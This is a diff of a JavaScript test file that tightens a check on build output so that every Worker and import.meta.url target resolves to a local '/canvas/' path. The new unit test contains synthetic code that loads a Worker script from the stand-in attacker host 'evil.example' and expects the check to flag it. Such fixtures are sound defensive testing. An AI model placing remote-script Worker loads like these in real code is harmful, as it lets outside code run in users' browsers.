@@ -90,13 +90,14 @@ const renderedModules = (output) =>
         .map(([id]) => id.replaceAll("\\", "/")),
     );
 
+const isLocal = (url) =>
+  url.origin === new URL(DEPLOY).origin && url.pathname.startsWith("/canvas/");
+
 function expectLocal(target, base, where) {
   const url = new URL(target, base);
-  expect(
-    url.origin === new URL(DEPLOY).origin &&
-      url.pathname.startsWith("/canvas/"),
-    `${where}: ${target} resolves to ${url.href}`,
-  ).toBe(true);
+  expect(isLocal(url), `${where}: ${target} resolves to ${url.href}`).toBe(
+    true,
+  );
 }
 
 // The computed targets the editor output already holds, per occurrence.
@@ -128,20 +129,22 @@ const COMPUTED = [
 
 const LITERAL = /^(?:`[^`$]*`|"[^"\\]*"|'[^'\\]*')$/u;
 
+const URL_PATTERN =
+  /new URL\(((?:[^()]|\([^()]*\))*?),(?:``\+)?import\.meta\.url\)/gu;
+
 /**
  * Every `new URL(<target>, import.meta.url)` and `new Worker(...)` in the
- * code: literal targets must be local; computed ones must be one of
- * COMPUTED, each found exactly once in the whole output.
+ * code of `sources` ({ fileName, code }): literal targets must be local;
+ * computed ones must be one of COMPUTED, matched occurrence by occurrence;
+ * a Worker's first argument must itself be one of those accepted URLs, and
+ * nothing more. Returns the problems and how often each COMPUTED shape
+ * occurred.
  */
-function checkCodeTargets(output) {
+function codeTargetProblems(sources) {
+  const problems = [];
   const found = new Map(COMPUTED.map(({ name }) => [name, 0]));
-  const sources = [
-    ...output.filter((item) => item.type === "chunk"),
-    ...workerAssets(output),
-  ];
-  for (const item of sources) {
-    const code = text(item);
-    const base = new URL(item.fileName, DEPLOY);
+  for (const { fileName, code } of sources) {
+    const base = new URL(fileName, DEPLOY);
     const recognised = new Set();
     for (const { name, pattern } of COMPUTED)
       for (const match of code.matchAll(pattern)) {
@@ -149,36 +152,65 @@ function checkCodeTargets(output) {
         recognised.add(start);
         found.set(name, found.get(name) + 1);
       }
-    const urlPattern =
-      /new URL\(((?:[^()]|\([^()]*\))*?),(?:``\+)?import\.meta\.url\)/gu;
-    for (const match of code.matchAll(urlPattern)) {
+    // Start of each accepted `new URL(…, import.meta.url)` -> its end.
+    const accepted = new Map();
+    const urls = [...code.matchAll(URL_PATTERN)];
+    for (const match of urls) {
       const target = match[1].trim();
+      const end = match.index + match[0].length;
       if (LITERAL.test(target)) {
-        expectLocal(target.slice(1, -1), base, item.fileName);
-        continue;
-      }
-      expect(
-        recognised.has(match.index),
-        `${item.fileName}: computed new URL(${target}, import.meta.url)`,
-      ).toBe(true);
+        const url = new URL(target.slice(1, -1), base);
+        if (isLocal(url)) accepted.set(match.index, end);
+        else problems.push(`${fileName}: ${target} resolves to ${url.href}`);
+      } else if (recognised.has(match.index)) accepted.set(match.index, end);
+      else
+        problems.push(
+          `${fileName}: computed new URL(${target}, import.meta.url)`,
+        );
     }
     for (const match of code.matchAll(/new (?:Shared)?Worker\(/gu)) {
-      const rest = code.slice(match.index + match[0].length);
-      expect(
-        rest.startsWith("new URL("),
-        `${item.fileName}: Worker without new URL(...): ${rest.slice(0, 60)}`,
-      ).toBe(true);
+      const argument = match.index + match[0].length;
+      const end = accepted.get(argument);
+      if (end === undefined || !/^[,)]/u.test(code.slice(end)))
+        problems.push(
+          `${fileName}: Worker argument is not an accepted new URL(…, import.meta.url): ${code.slice(argument, argument + 60)}`,
+        );
     }
     // Anything else resolved against the module's own address.
-    const bare = code.split("import.meta.url").length - 1;
-    const counted = [...code.matchAll(urlPattern)].length;
-    expect(bare, `${item.fileName}: import.meta.url outside new URL`).toBe(
-      counted,
-    );
+    if (code.split("import.meta.url").length - 1 !== urls.length)
+      problems.push(`${fileName}: import.meta.url outside new URL`);
   }
+  return { problems, found };
+}
+
+function checkCodeTargets(output) {
+  const sources = [
+    ...output.filter((item) => item.type === "chunk"),
+    ...workerAssets(output),
+  ].map((item) => ({ fileName: item.fileName, code: text(item) }));
+  const { problems, found } = codeTargetProblems(sources);
+  expect(problems).toEqual([]);
   for (const [name, count] of found)
     expect(count, `${name} occurrences`).toBe(1);
 }
+
+it("reports a Worker whose first argument is not an accepted local URL", () => {
+  const { problems } = codeTargetProblems([
+    {
+      fileName: "assets/synthetic.js",
+      code: [
+        'new Worker(new URL("./ok.js",import.meta.url),{type:"module"});',
+        'new Worker(new URL("https://evil.example/w.js", document.baseURI));',
+        'new Worker("https://evil.example/w.js");',
+      ].join(""),
+    },
+  ]);
+  expect(problems).toHaveLength(2);
+  expect(problems[0]).toMatch(/Worker argument.*document\.baseURI/u);
+  expect(problems[1]).toMatch(
+    /Worker argument.*: "https:\/\/evil\.example\/w\.js"\)/u,
+  );
+});
 
 /** Static and dynamic imports in emitted worker JavaScript, from its AST. */
 function workerImports(code, fileName) {
